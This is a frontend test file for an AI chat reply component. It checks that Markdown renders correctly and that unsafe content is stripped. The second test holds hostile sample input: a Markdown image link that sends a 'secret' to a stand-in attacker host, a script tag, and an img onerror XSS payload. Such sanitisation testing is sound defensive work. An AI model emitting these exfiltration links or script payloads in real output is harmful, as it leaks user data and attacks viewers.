// An assistant reply is shown formatted, not as Markdown source. The real
// `marked` bundle (the one the app serves) is evaluated into the window here,
// so this covers what the browser renders.
import { afterEach, beforeAll, describe, expect, it } from "vitest";
import { cleanup, render, waitFor } from "@testing-library/react";
import AiReply from "../../aichat/AiReply";
import markedSource from "../../../public/marked.min.js?raw";

beforeAll(() => {
  new Function(markedSource).call(window);
  const w = window as unknown as { marked?: unknown };
  w.marked ??= (globalThis as unknown as { marked?: unknown }).marked;
});

afterEach(cleanup);

describe("AiReply", () => {
  it("formats bold text, quotes and lists", async () => {
    const { container } = render(
      <AiReply
        content={
          "Drafted for **asha@example.com**.\n\n> Hi,\n>\n> Thanks.\n\n- one\n- two"
        }
      />
    );
    await waitFor(() =>
      expect(container.querySelector(".ai-msg-rich")).toBeTruthy()
    );
    expect(container.querySelector("strong")?.textContent).toBe(
      "asha@example.com"
    );
    expect(container.querySelector("blockquote")?.textContent).toContain(
      "Thanks."
    );
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.textContent).not.toContain("**");
  });

  it("drops images and scripts from a reply", async () => {
    const { container } = render(
      <AiReply
        content={
          "Done ![x](https://evil.example/p.png?d=secret)\n\n<script>steal()</script><img src=x onerror=steal()>"
        }
      />
    );
    await waitFor(() =>
      expect(container.querySelector(".ai-msg-rich")).toBeTruthy()
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });
});
